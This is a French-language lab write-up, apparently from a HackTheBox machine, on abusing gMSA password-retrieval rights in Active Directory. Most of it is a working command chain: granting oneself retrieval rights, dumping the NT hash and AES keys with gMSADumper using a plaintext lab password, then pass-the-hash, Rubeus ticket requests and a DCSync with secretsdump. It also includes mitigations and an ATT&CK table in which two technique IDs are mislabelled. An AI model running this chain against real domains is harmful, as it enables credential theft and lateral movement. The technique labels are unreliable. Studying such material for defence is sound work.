# Abus des gMSA via msDS-GroupMSAMembership

***

### <mark style="color:blue;">📂</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Définition :**</mark>

Un **gMSA (Group Managed Service Account)** est un compte AD spécial, utilisé pour exécuter des services avec des mots de passe gérés automatiquement par les DC.\
Leur mot de passe peut être **lu uniquement par des principaux autorisés** via l’attribut :

```
msDS-GroupMSAMembership
```

***

### <mark style="color:blue;">⚠️</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Problème :**</mark>

Si un utilisateur possède le droit `WriteProperty` sur cet attribut, **il peut s’ajouter lui-même** à la liste des comptes autorisés à récupérer le mot de passe du gMSA.\
💥 Cela permet ensuite d’**extraire les credentials Kerberos (NT hash, AES keys)** et d’**utiliser le compte comme pivot**.

***

### <mark style="color:blue;">🧪</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Conditions requises :**</mark>

| Condition                                    | Présent                            |
| -------------------------------------------- | ---------------------------------- |
| Un gMSA existant dans AD                     | ✅ `Haze-IT-Backup$`                |
| Un utilisateur avec `WriteProperty` sur gMSA | ✅ `mark.adams` via `gMSA_Managers` |
| Accès WinRM ou shell PowerShell              | ✅ Evil-WinRM actif                 |
| BloodHound pour valider les ACLs             | ✅ Utilisé avec `bloodhound-python` |

***

### <mark style="color:blue;">🔁</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Étapes d’exploitation réelles :**</mark>

<mark style="color:green;">**1. 🎯 Enumération du droit**</mark>

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity "Haze-IT-Backup"
```

<mark style="color:green;">**2. ✍️ Ajout du compte dans les retrieveurs**</mark>

```powershell
$gMSA = "Haze-IT-Backup"
$PrincipalToAdd = "mark.adams"
$original = Get-ADServiceAccount -Properties PrincipalsAllowedToRetrieveManagedPassword $gMSA |
            Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword
$new = $original + $PrincipalToAdd
Set-ADServiceAccount -PrincipalsAllowedToRetrieveManagedPassword $new $gMSA
```

<mark style="color:green;">**3. 🔓 Extraction des secrets du gMSA**</mark>

```bash
python3 gMSADumper.py -u 'mark.adams' -p 'Ld@p_Auth_Sp1unk@2k24' -d haze.htb
```

➡️ Tu récupères :

```
Haze-IT-Backup$:::<NT hash>
aes256: <AES256 key>
aes128: <AES128 key>
```

***

### <mark style="color:blue;">🧠</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**Utilisation du compte gMSA :**</mark>

<mark style="color:green;">**🔥 Pass-the-Hash**</mark>

```bash
evil-winrm -u Haze-IT-Backup$ -H <nt hash> -i <victim-ip>
```

<mark style="color:green;">**🧪 Pass-the-Ticket (Rubeus)**</mark>

```powershell
Rubeus.exe asktgt /user:Haze-IT-Backup$ /rc4:<nt hash> /domain:haze.htb
```

<mark style="color:green;">**🔓 DCSync (si droits élevés)**</mark>

```bash
secretsdump.py haze.htb/Haze-IT-Backup$@DC01.haze.htb -hashes :<nt hash>
```

***

#### <mark style="color:green;">🖼️</mark> <mark style="color:green;"></mark><mark style="color:green;">**Diagramme ASCII**</mark>

```
[ mark.adams ]
     |
     | Member of
     v
[ gMSA_Managers ]
     |
     | WriteProperty on
     v
[ Haze-IT-Backup$ (gMSA) ]
     |
     | + Add to PrincipalsAllowedToRetrieveManagedPassword
     v
[ gMSADumper → NT hash, AES keys ]
     |
     v
[ Auth / pivot / lateral movement ]
```

***

#### <mark style="color:green;">💥</mark> <mark style="color:green;"></mark><mark style="color:green;">**Impact**</mark>

| Impact potentiel                                                    | Description                       |
| ------------------------------------------------------------------- | --------------------------------- |
| 🎯 Récupération d’un compte service                                 | Accès au NT hash + clefs Kerberos |
| 🧬 Utilisable pour pass-the-hash/ticket                             | Auth via Haze-IT-Backup$          |
| 🛠️ Possible élévation jusqu’à DA (si le gMSA a des droits étendus) |                                   |

***

#### <mark style="color:green;">🔒</mark> <mark style="color:green;"></mark><mark style="color:green;">**Mitigation**</mark>

| Contre-mesure                                    | Explication                                    |
| ------------------------------------------------ | ---------------------------------------------- |
| 🔐 Restreindre les ACLs sur les objets gMSA      | Aucun WriteProperty pour users non privilégiés |
| 👀 Monitorer l’usage de `Set-ADServiceAccount`   | Activité anormale = alerte                     |
| 📜 Journaliser les lectures de mot de passe gMSA | Pour traçabilité SIEM                          |
| 🧼 Révoquer les retrieveurs inutiles             | Minimise la surface d’attaque                  |

***

#### <mark style="color:green;">📌</mark> <mark style="color:green;"></mark><mark style="color:green;">**MITRE ATT\&CK Mapping**</mark>

| ID            | Nom                              |
| ------------- | -------------------------------- |
| **T1098.004** | Account Manipulation: gMSA Abuse |
| **T1550.002** | Use of Pass-the-Hash             |
| **T1558.003** | Steal or Forge Kerberos Tickets  |

***

### <mark style="color:blue;">✅ Résumé final</mark>

| Élément               | Valeur                                        |
| --------------------- | --------------------------------------------- |
| Compte abusé          | `Haze-IT-Backup$` (gMSA)                      |
| Compte attaquant      | `mark.adams`                                  |
| Droit exploité        | `WriteProperty` sur `msDS-GroupMSAMembership` |
| Outil final           | `gMSADumper.py`                               |
| Credentials récupérés | NT hash, AES128/256                           |
| Exploitation possible | WinRM, Kerberos, Pivot                        |

***
